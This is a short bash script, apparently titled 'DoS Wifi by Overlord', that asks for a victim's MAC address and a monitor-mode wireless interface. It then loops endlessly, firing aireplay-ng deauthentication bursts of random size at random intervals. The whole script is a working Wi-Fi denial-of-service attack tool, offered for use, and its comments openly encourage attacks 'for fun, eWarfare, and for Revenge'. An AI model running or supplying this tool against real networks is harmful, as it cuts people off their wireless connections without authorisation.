#!/bin/bash
#DoS Wifi by Overlord
echo "Good day for a DoS $USER, don't you think?"
echo "Enter the victim MAC and press [ENTER]: "
read VMAC
echo "Enter the weapon(wlan1mon, wlan0mon), and press enter [ENTER]: "
read weapon
echo "Remember, do for fun, eWarfare, and for Revenge"
read -p "Press any key for start the attack"
for (( ; ; ))
do 
time=$[($RANDOM % 100)+1]
deautp=$[($RANDOM % 100)+1]
echo "Random values, get coffe"
aireplay-ng -0 $deautp -a $VMAC $weapon
echo "Waiting new values, current: $time seg"
sleep $time
done
